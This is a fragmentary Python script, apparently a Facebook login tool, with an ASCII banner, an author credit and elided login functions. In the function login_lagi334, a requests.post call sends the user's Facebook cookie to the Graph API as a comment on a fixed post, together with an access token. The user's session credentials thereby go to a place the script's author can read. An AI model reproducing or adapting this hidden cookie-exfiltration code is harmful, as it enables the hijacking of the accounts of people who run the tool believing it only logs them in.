...
╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═════╝░╚═╝╚═════╝░╚═════╝░
			...
			{m}•{k}•{h}•{sir} Author : RABBIDS SI BANDIT {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		...
		requests.post(f"https://graph.facebook.com/v15.0/100086307556768_168030709417180/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
